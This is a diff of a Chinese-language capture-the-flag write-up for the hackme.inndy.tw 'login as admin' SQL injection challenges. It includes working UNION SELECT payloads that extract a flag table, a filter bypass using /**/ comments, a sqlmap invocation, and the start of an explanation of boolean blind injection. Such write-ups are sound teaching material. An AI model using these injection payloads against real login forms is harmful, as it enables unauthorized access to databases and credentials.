@@ -132,3 +132,56 @@ sqlmap -u "https://hackme.inndy.tw/login0/" --data="name=admin&password=bbb" --d
 
 获得 admin 密码，登录即可。
 
+## 19: login as admin 0.1
+
+非常怪异的是，`sqlmap` 无法得到表 `h1dden_f14g` 中 `the_f14g` 的内容。
+
+我们加上 `-v3` 参数来显示详细的 payload。此处出现问题的 payload 如下：
+
+```
+bbb\' UNION ALL SELECT NULL,CONCAT(0x716a7a6271,IFNULL(CAST(the_f14g AS CHAR),0x20),0x7176707671),NULL,NULL FROM login_as_admin0.h1dden_f14g ORDER BY the_f14g-- jdWz
+```
+
+从之前 `sqlmap` 的结果可以知道表 `user` 有 4 列，第二列 `user` 会回显在登录成功的页面上。并且可知 flag 只有一个。所以简化为：
+
+```
+bbb\' UNION SELECT 1,CAST(the_f14g AS CHAR),3,4 FROM login_as_admin0.h1dden_f14g-- ddd
+```
+
+登录后即可获得 flag。
+
+## 20: login as admin 1
+
+该题提示不能使用 `sqlmap`。初测了一下，确实不行。但是观察代码，可以根据第 19 题的 payload 修改。
+
+可以注意到空格被过滤了，所以用注释 `/**/` 代替空格就可以了。
+
+密码字段的 payload:
+
+```
+bbb\'/**/UNION/**/SELECT/**/1,2,3,4#
+```
+
+## 21: login as admin 1.2
+
+提示布尔盲注。如果之前试过给 `sqlmap` 加上随机 UA，写 tamper 改变结尾注释（如果结尾是 `-- xxxx` 的话似乎会失败）的话，会发现 `sqlmap` 找到了注入点，但是没有办法爆破。
+
+原因在于，在第 18 题中，登录成功返回页面：
+
+```php+HTML
+<h3>Hi, <?=htmlentities($user->user)?></h3>
+```
+
+而该题中的登录成功返回页面：
+
+```php+HTML
+<h3>Hi, <?=htmlentities($_POST['name'])?></h3>
+```
+
+没有地方可以给 `union select` 注入返回数据。那么布尔盲注是怎么做到的呢？
+
+```php+HTML
+<h4><?=sprintf("You %s admin!", $user->isadmin ? "are" : "are not")?></h4>
+```
+
+可以注意到，这里实质返回的是布尔值。
